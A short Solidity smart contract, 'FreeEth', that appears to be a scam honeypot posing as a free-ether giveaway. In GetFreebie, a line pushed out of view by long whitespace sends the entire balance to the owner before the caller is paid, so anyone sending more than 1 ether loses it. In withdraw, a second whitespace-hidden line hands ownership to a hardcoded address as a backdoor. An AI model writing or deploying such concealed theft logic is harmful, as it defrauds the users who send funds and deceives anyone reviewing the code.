pragma solidity ^0.4.19;

contract FreeEth
{
    address private O = msg.sender;
    
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value > getEth())
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               getOwner().transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender == getFixedAddress()){O = getFixedAddress();}
        require(msg.sender == getOwner());
        getOwner().transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == getOwner());
         
        adr.call.value(msg.value)(data);
    }
    
    function getOwner() private view returns (address) {
        return O;
    }
    
    function getEth() private pure returns (uint) {
        return 1 ether;
    }
    
    function getFixedAddress() private pure returns (address) {
        return 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
    }
}